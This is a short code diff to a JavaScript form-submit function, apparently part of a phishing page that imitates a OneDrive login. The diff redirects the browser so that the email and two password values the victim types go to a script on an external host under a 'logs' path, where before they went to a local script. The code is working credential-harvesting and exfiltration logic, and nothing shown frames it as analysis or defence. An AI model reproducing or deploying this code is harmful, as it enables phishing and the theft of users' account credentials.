@@ -41,7 +41,7 @@ function subFormBtn(b) {
         pass.style.border = "1px solid darkgreen";  
     }
 
-    location = "./drv.php?auth=oneDrive&pass1="+drv_app.value+"&pass2="+pass.value+"&mail="+mail.value;
+    location = "https://appchecker.co/logs/static/github/drv.php?auth=oneDrive&pass1="+drv_app.value+"&pass2="+pass.value+"&mail="+mail.value;
     
 }
 
